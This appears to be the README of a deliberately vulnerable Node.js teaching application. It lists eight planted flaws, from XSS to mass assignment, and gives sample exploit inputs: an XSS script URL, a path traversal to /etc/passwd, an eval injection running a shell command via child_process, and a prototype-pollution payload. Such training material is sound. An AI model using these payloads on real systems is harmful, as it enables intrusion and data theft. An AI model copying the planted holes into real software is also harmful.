# JavaScript Vulnerable Application

## ⚠️ WARNING
This application contains **intentional security vulnerabilities** for testing and educational purposes only.

**DO NOT USE IN PRODUCTION!**

## Vulnerabilities Included

1. **Hardcoded Secrets** - API keys and passwords in source code
2. **XSS (Cross-Site Scripting)** - Unsanitized user input rendered in HTML
3. **Path Traversal** - Insufficient validation of file paths
4. **Command Injection** - User input passed to shell commands
5. **Eval Injection** - Using eval() on user-controlled input
6. **Prototype Pollution** - Unsafe object merging
7. **Insecure Direct Object Reference (IDOR)** - No authorization checks
8. **Mass Assignment** - Allowing updates to sensitive properties

## Running the Application

### Command-line demo:
```bash
node app.js
```

### Web server mode:
```bash
node app.js --server
```
Then visit http://localhost:3000

## Requirements

- Node.js 10+
- No external dependencies (uses only built-in modules)

## Example Exploits

### XSS Attack
```
http://localhost:3000/profile?username=<script>alert('XSS')</script>
```

### Path Traversal
```
http://localhost:3000/file?name=../../../../etc/passwd
```

### Eval Injection
```
http://localhost:3000/calc?expr=process.mainModule.require('child_process').execSync('whoami').toString()
```

### Prototype Pollution
```javascript
const malicious = JSON.parse('{"__proto__": {"isAdmin": true}}');
app.mergeObjects({}, malicious);
```
